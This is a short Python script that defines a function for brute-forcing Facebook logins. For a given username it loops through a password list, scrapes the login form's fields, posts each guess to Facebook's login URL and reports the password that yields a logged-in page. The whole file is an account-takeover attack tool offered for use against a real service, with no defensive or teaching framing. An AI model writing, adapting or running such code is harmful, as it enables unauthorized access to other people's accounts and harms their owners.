import requests
from bs4 import BeautifulSoup

def brute_force_facebook(username, password_list):
    login_url = "https://www.facebook.com/login"
    
    for password in password_list:
        session = requests.Session()
        response = session.get(login_url)
        soup = BeautifulSoup(response.text, "html.parser")
        
        # Extract the login form data
        login_form_data = {}
        for input_tag in soup.find_all("input"):
            input_name = input_tag.get("name")
            input_value = input_tag.get("value", "")
            login_form_data[input_name] = input_value
        
        # Update the login form data with the provided username and password
        login_form_data["email"] = username
        login_form_data["pass"] = password
        
        # Send the login request
        login_response = session.post(login_url, data=login_form_data)
        
        # Check if the login was successful
        if "Log Out" in login_response.text:
            print(f"Successful login with username: {username} and password: {password}")
            return True
        else:
            print(f"Failed login with username: {username} and password: {password}")
    
    print("Brute force attack failed.")
    return False
